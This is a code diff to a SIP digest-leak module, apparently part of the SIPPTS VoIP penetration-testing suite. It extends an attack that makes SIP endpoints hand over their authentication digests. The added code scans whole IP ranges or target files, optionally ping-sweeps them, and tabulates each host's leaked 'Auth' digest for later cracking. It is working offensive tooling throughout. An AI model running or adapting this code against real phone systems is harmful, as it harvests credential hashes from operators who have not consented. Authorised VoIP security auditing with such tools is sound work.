@@ -7,12 +7,15 @@ __license__ = "GPL"
 __copyright__ = "Copyright (C) 2015-2022, SIPPTS"
 __email__ = "pepeluxx@gmail.com"
 
+import ipaddress
+import re
 import socket
 import sys
 import ssl
-from lib.functions import create_message, create_response_error, create_response_ok, parse_message, parse_digest, generate_random_string, get_machine_default_ip, ip2long, get_free_port, calculateHash
+import time
+import signal
+from lib.functions import create_message, create_response_error, create_response_ok, parse_message, parse_digest, generate_random_string, get_machine_default_ip, ip2long, get_free_port, calculateHash, long2ip, ping
 from lib.color import Color
-
 
 
 class SipDigestLeak:
@@ -38,6 +41,11 @@ class SipDigestLeak:
         self.sdp = 0
         self.sdes = 0
         self.verbose = 0
+        self.file = ''
+
+        self.quit = False
+        self.found = []
+        self.ping = False
 
         self.c = Color()
 
@@ -66,15 +74,115 @@ class SipDigestLeak:
         if self.rport == 5060 and self.proto == 'TLS':
             self.rport = 5061
 
-        print(self.c.BWHITE + '[!] Target: ' + self.c.GREEN + '%s:%s/%s' %
-              (self.ip, self.rport, self.proto))
-        print(self.c.BWHITE + '[!] Caller: ' + self.c.GREEN + '%s' % self.from_user)
-        print(self.c.BWHITE + '[!] Callee: ' + self.c.GREEN + '%s' % self.to_user)
+        signal.signal(signal.SIGINT, self.signal_handler)
+        print(self.c.BYELLOW + '\nPress Ctrl+C to stop\n')
         print(self.c.WHITE)
 
-        self.call(self.ip, self.rport, self.proto)
+        if self.domain != '' and self.domain != str(self.ip) and self.domain != self.host:
+            print(self.c.BWHITE + '[!] Customized Domain: ' +
+                  self.c.GREEN + '%s' % self.domain)
+        if self.contact_domain != '':
+            print(self.c.BWHITE + '[!] Customized Contact Domain: ' + self.c.GREEN + '%s' %
+                  self.contact_domain)
+        if self.from_name != '':
+            print(self.c.BWHITE + '[!] Customized From Name: ' +
+                  self.c.GREEN + '%s' % self.from_name)
+        if self.from_user != '100':
+            print(self.c.BWHITE + '[!] Customized From User: ' +
+                  self.c.GREEN + '%s' % self.from_user)
+        if self.from_domain != '':
+            print(self.c.BWHITE + '[!] Customized From Domain: ' +
+                  self.c.GREEN + '%s' % self.from_domain)
+        if self.to_name != '':
+            print(self.c.BWHITE + '[!] Customized To Name: ' +
+                  self.c.GREEN + '%s' % self.to_name)
+        if self.to_user != '100':
+            print(self.c.BWHITE + '[!] Customized To User:' +
+                  self.c.GREEN + ' %s' % self.to_user)
+        if self.to_domain != '':
+            print(self.c.BWHITE + '[!] Customized To Domain: ' +
+                  self.c.GREEN + '%s' % self.to_domain)
+        if self.user_agent != 'pplsip':
+            print(self.c.BWHITE + '[!] Customized User-Agent: ' +
+                  self.c.GREEN + '%s' % self.user_agent)
+
+        if self.file == '':
+            ips = []
+            hosts = []
+            for i in self.ip.split(','):
+                try:
+                    i = socket.gethostbyname(i)
+                except:
+                    pass
+                hlist = list(ipaddress.ip_network(str(i)).hosts())
+
+                if hlist == []:
+                    hosts.append(i)
+                else:
+                    for h in hlist:
+                        hosts.append(h)
+
+            last = len(hosts)-1
+            start_ip = hosts[0]
+            end_ip = hosts[last]
+
+            ipini = int(ip2long(str(start_ip)))
+            ipend = int(ip2long(str(end_ip)))
+
+            for i in range(ipini, ipend+1):
+                if self.ping == 'False':
+                    ips.append(long2ip(i))
+                else:
+                    print(self.c.YELLOW + '[+] Ping %s ...' %
+                            str(long2ip(i)) + self.c.WHITE, end='\r')
+
+                    if ping(long2ip(i), '0.1') == True:
+                        print(self.c.GREEN + '\n   [-] ... Pong %s' %
+                                str(long2ip(i)) + self.c.WHITE)
+                        ips.append(long2ip(i))
+
+            for ip in ips:
+                if self.quit == False:
+                    self.call(ip, self.rport, self.proto)
+        else:
+            try:
+                with open(self.file) as f:
+                    line = f.readline()
+
+                    while line and self.quit == False:
+                        m = re.search(
+                            '([0-9]*.[0-9]*.[0-9]*.[0-9]*):([0-9]*)\/([A-Z]*)', line)
+                        if m:
+                            self.ip = '%s' % (m.group(1))
+                            self.port = '%s' % (m.group(2))
+                            self.proto = '%s' % (m.group(3))
+
+                        self.call(self.ip, self.rport, self.proto)
+                        line = f.readline()
+
+                f.close()
+            except:
+                print('Error reading file %s' % self.file)
+                exit()
+
+        self.found.sort()
+        self.print()
+
+    def signal_handler(self, sig, frame):
+        self.stop()
+
+    def stop(self):
+        self.quit = True
+        time.sleep(0.1)
+        print(self.c.BYELLOW + '\nYou pressed Ctrl+C!')
+        print(self.c.BWHITE + '\nStopping script ... wait a moment\n')
+        print(self.c.WHITE)
 
     def call(self, ip, port, proto):
+        print(self.c.BWHITE + '[!] Target: ' + self.c.GREEN + '%s:%s/%s' %
+              (ip, port, proto))
+        print(self.c.WHITE)
+
         cseq = '1'
         auth_type = 1
         rr = ''
@@ -261,11 +369,13 @@ class SipDigestLeak:
                                     headers['response_code'], headers['response_text'])
                                 rescode = headers['response_code']
 
-                                print(self.c.CYAN + '[<=] Response %s' % response)
+                                print(self.c.CYAN +
+                                      '[<=] Response %s' % response)
                                 if self.verbose == 1:
                                     print(self.c.BWHITE + '[+] Receiving from %s:%s/%s ...' %
                                           (self.ip, self.rport, self.proto))
-                                    print(self.c.GREEN + resp.decode() + self.c.WHITE)
+                                    print(self.c.GREEN +
+                                          resp.decode() + self.c.WHITE)
 
                                 if rescode[:1] != '1':
                                     totag = headers['totag']
@@ -279,7 +389,8 @@ class SipDigestLeak:
                                     if self.verbose == 1:
                                         print(self.c.BWHITE + '[+] Sending to %s:%s/%s ...' %
                                               (self.ip, self.rport, self.proto))
-                                        print(self.c.YELLOW + msg + self.c.WHITE)
+                                        print(self.c.YELLOW +
+                                              msg + self.c.WHITE)
 
                                     if self.proto == 'TLS':
                                         sock_ssl.sendall(
@@ -320,8 +431,15 @@ class SipDigestLeak:
                     sock.sendto(bytes(msg[:8192], 'utf-8'), host)
 
                 # wait for BYE
+                start = time.time()
                 bye = False
                 while bye == False:
+                    now = time.time()
+
+                    # Wait 30 sec max
+                    if now-start > 30:
+                        break
+
                     print(self.c.WHITE + '\t... waiting for BYE ...')
 
                     if self.proto == 'TLS':
@@ -402,6 +520,9 @@ class SipDigestLeak:
                 if auth != '':
                     print(self.c.BGREEN + 'Auth=%s\n' % auth + self.c.WHITE)
 
+                    line = '%s###%d###%s###%s' % (ip, port, proto, auth)
+                    self.found.append(line)
+
                     headers = parse_digest(auth)
 
                     if self.ofile != '':
@@ -413,11 +534,19 @@ class SipDigestLeak:
                         f.write('\n')
                         f.close()
 
-                        print(self.c.WHITE+'Auth data saved in file %s' % self.ofile)
+                        print(self.c.WHITE+'Auth data saved in file %s' %
+                              self.ofile)
                 else:
-                    print(self.c.BRED + 'No Auth Digest received :(\n' + self.c.WHITE)
+                    print(self.c.BRED +
+                          'No Auth Digest received :(\n' + self.c.WHITE)
+                    line = '%s###%d###%s###No Auth Digest received :(' % (
+                        ip, port, proto)
+                    self.found.append(line)
         except socket.timeout:
             print(self.c.BRED + 'No Auth Digest received :(\n' + self.c.WHITE)
+            line = '%s###%d###%s###No Auth Digest received :(' % (
+                ip, port, proto)
+            self.found.append(line)
             pass
         except:
             pass
@@ -425,3 +554,53 @@ class SipDigestLeak:
             sock.close()
 
         return
+
+    def print(self):
+        iplen = len('IP address')
+        polen = len('Port')
+        prlen = len('Proto')
+        relen = len('Response')
+
+        for x in self.found:
+            (ip, port, proto, res) = x.split('###')
+            if len(ip) > iplen:
+                iplen = len(ip)
+            if len(port) > polen:
+                polen = len(port)
+            if len(proto) > prlen:
+                prlen = len(proto)
+            if len(res) > relen:
+                relen = len(res)
+
+        tlen = iplen+polen+prlen+relen+11
+
+        print(self.c.WHITE + ' ' + '-' * tlen)
+        print(self.c.WHITE +
+              '| ' + self.c.BWHITE + 'IP address'.ljust(iplen) + self.c.WHITE +
+              ' | ' + self.c.BWHITE + 'Port'.ljust(polen) + self.c.WHITE +
+              ' | ' + self.c.BWHITE + 'Proto'.ljust(prlen) + self.c.WHITE +
+              ' | ' + self.c.BWHITE + 'Response'.ljust(relen) + self.c.WHITE + ' |')
+        print(self.c.WHITE + ' ' + '-' * tlen)
+
+        if len(self.found) == 0:
+            print(self.c.WHITE + '| ' + self.c.WHITE +
+                  'Nothing found'.ljust(tlen-2) + ' |')
+        else:
+            for x in self.found:
+                (ip, port, proto, res) = x.split('###')
+
+                if res == 'No Auth Digest received :(':
+                    colorres = self.c.RED
+                else:
+                    colorres = self.c.BLUE
+
+                print(self.c.WHITE +
+                      '| ' + self.c.BGREEN + '%s' % ip.ljust(iplen) + self.c.WHITE +
+                      ' | ' + self.c.YELLOW + '%s' % port.ljust(polen) + self.c.WHITE +
+                      ' | ' + self.c.YELLOW + '%s' % proto.ljust(prlen) + self.c.WHITE +
+                      ' | ' + colorres + '%s' % res.ljust(relen) + self.c.WHITE + ' |')
+
+        print(self.c.WHITE + ' ' + '-' * tlen)
+        print(self.c.WHITE)
+
+        self.found.clear()
